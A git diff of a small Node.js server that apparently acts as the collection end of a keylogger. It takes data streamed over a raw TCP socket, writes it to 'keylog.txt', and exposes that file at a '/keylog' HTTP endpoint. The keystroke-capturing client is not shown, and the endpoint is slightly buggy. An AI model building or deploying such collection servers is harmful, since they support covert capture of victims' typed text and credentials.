@@ -1,23 +1,24 @@
 const net = require('net');
 const path = require('path');
-const { readFileSync } = require('fs');
-const jsdom = require("jsdom");
-const { JSDOM } = jsdom;
+const { writeFileSync, readFileSync } = require('fs');
 const express = require('express');
 const app = express();
 
-const page = readFileSync('./public/index.html', 'utf-8');
-const document = new JSDOM(page).window.document;
-const logger = document.getElementById('logger');
-
-app.use('/', express.static(path.join(__dirname + '/public')));
+app.use('/', express.static(path.join(__dirname + '/public'))); //<-- Sends page
+app.get('/keylog', (req, res) => {
+    res.send(_ => readFileSync('./keylog.txt'));
+});
 
 const server = net.createServer(socket => {
     console.log("Client connected!");
     socket.on('data', data => {
-        logger.innerHTML = data.toString();
+        try {
+            writeFileSync('./keylog.txt', data.toString(), { mode: 0o755 });
+        } catch(error) {
+            console.error(error);
+        }
     })
 });
 
-app.listen(8080)
-server.listen(3000);
+app.listen(8080)    //<--Express server (delivers page and has endpoint)
+server.listen(3000);    //<--Net server (listen socket streaming)
